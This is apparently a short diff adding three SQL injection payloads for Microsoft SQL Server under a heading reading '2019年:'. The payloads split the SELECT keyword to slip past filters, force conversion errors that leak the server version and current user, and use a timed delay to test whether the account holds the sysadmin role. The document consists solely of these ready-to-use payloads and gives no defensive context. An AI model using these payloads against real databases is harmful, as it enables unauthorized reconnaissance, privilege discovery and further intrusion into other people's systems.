@@ -1,0 +1,4 @@
+2019年:
+1%';execute('sel'%2b'ect convert(int,@@version)') --
+1%';execute('sel'%2b'ect convert(int,user)') --
+1%';'if(select IS_SRVROLEMEMBER('sysadmin'))=1 waitfor delay '0:0:5' --
